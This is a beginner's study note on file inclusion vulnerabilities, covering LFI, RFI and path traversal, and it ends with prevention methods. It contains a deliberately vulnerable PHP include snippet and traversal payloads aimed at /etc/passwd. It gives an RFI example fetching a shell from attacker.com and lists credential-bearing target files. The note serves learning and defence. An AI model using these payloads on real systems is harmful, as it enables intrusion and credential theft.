# Day 14 — File Inclusion

## 📌 What I Learned
File Inclusion is a vulnerability where
an attacker tricks the server into
including unintended files —
either from the same server
or from a remote server.

---

## 🔧 What is File Inclusion — How it Works

Instead of putting all content in one
huge file and rewriting the same content
repeatedly, developers divide code into
smaller files and include them in the
main file whenever needed.

The computer reads those files and
inserts their contents into the final page.

---

## ⚠️ The Vulnerability

*Vulnerable code example:*
php
$page = $_GET['page'];
include($page);



Problem:
User controls which file gets included!

Normal use:
?page=about.php  ✅

Attacker use:
?page=secret.txt 😱
?page=../../../etc/passwd 😱

Server includes unintended files!
That's File Inclusion Vulnerability!


*Arbitrary file path:*

A file location that can be
dynamically modified or
specified by the user —
this is what makes it dangerous!


---

## 📁 LFI — Local File Inclusion


LFI = Same computer/server

Tricking the server into opening
a file that already exists
on the SAME server!

Example:
?page=../../../etc/passwd

Server reads its own
password file and
shows it to attacker!


---

## 🌐 RFI — Remote File Inclusion


RFI = Another computer on internet

Tricking the server into opening
a file located on ANOTHER server!

Example:
?page=http://attacker.com/shell.php

Server downloads and executes
attacker's malicious file!
Much more dangerous than LFI!
Full server takeover possible!


---

## 🗂️ Path Traversal — Directory Traversal

Path traversal (also called directory
traversal) is a vulnerability where
an attacker manipulates a file path
to access files and directories
outside the intended location.


../ means "go up one folder"

Example structure:
/var/www/html/images/ ← website runs here

../     = /var/www/html/
../../  = /var/www/
../../../ = /var/ 
../../../../ = / (root!)

Attack:
?filename=../../../etc/passwd

Climbs up folders one by one
until reaching sensitive files!


---

## 🎯 Important Target Files

### Linux Targets:

/etc/passwd
→ List of all users on server
→ First file to check!
→ Confirms LFI works!

/etc/shadow
→ Password hashes
→ Requires root access

/etc/hosts
→ Network information

/proc/version
→ OS and kernel version
→ Reveals server info!

/var/www/html/config.php
→ Database credentials!
→ Most valuable find!

/var/log/apache2/access.log
→ Server logs
→ Used in log poisoning attacks!


### Windows Targets:

C:\Windows\win.ini
C:\boot.ini
C:\Windows\System32\drivers\etc\hosts


---

## 🛡️ Prevention Methods


1. Input Validation
   Only allow expected filenames
   Reject anything with ../ 
   
2. Use an Allowlist
   Instead of accepting any file path
   map user choices to predefined files
   
   Example:
   "1" → about.php
   "2" → contact.php
   Never accept raw file paths!

3. Sanitize Input
   Remove dangerous characters:
   ../  ..\  %2e%2e%2f etc

4. Restrict File Access
   Use controlled mapping system
   Server should only access
   specific allowed directories

5. Disable Unnecessary Features
   If file inclusion not needed
   disable it completely!

6. Use Proper Permissions
   Files should have correct
   read/write permissions
   /etc/shadow not readable
   by web server user!

7. Keep Software Updated
   Old PHP versions have
   more file inclusion bugs!


